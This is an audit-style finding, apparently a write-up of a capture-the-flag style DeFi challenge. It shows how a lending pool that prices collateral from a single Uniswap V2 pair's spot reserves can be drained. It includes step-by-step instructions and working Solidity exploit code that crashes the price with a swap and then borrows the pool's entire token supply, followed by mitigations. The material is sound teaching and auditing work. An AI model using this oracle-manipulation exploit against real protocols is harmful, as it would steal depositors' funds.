### [H-1] Lending pool uses manipulable Uniswap V2 reserve ratio as sole collateral oracle

**Description:** `PuppetV2Pool._getOracleQuote()` derives the token price directly 
from the live `reservesWETH/reservesToken` ratio of a single Uniswap V2 pair via 
`UniswapV2Library.quote()`. This spot price has no manipulation resistance — no 
TWAP, no external price feed. Since `calculateDepositOfWETHRequired()` scales 
directly with this manipulable ratio, an attacker with sufficient token supply 
can crash the price in a single swap.

**Impact:** An attacker can dump their token balance into the Uniswap V2 pair via 
`swapExactTokensForTokens()`, crashing the WETH/token ratio, then borrow the 
lending pool's entire token reserve for a fraction of its true value in WETH 
collateral — fully draining the pool.

**Proof of Concept:**
1. Wrap player's ETH into WETH via `weth.deposit()`.
2. Approve the Uniswap V2 Router and swap the entire player token balance for 
   WETH — this inflates `reservesToken` and drains `reservesWETH`, crashing 
   the oracle quote.
3. Call `calculateDepositOfWETHRequired()` for the pool's full token balance — 
   now returns a fraction of its original value.
4. Approve the lending pool to pull the now-cheap WETH collateral and call 
   `borrow()` for the pool's entire token supply.
5. Transfer all borrowed tokens to the recovery account.

<details>
<summary>Example Code Snippet</summary>

```solidity
weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);

uniswapV2Router.swapExactTokensForTokens(
    PLAYER_INITIAL_TOKEN_BALANCE, 1, path, address(player), block.timestamp
);

uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
weth.approve(address(lendingPool), depositRequired);
lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

token.transfer(recovery, token.balanceOf(player));
```
</details>

**Recommended Mitigation:**
1. Never use a single AMM pair's spot reserve ratio as a lending collateral 
   oracle — use a time-weighted average price (TWAP) computed over multiple 
   blocks via `UniswapV2Oracle`-style accumulators.
2. Use a decentralized oracle network (e.g. Chainlink) for collateral pricing 
   instead of deriving it from on-chain liquidity ratios.
3. Add minimum liquidity depth requirements — reject borrows against pools 
   with insufficient reserves relative to the requested loan size.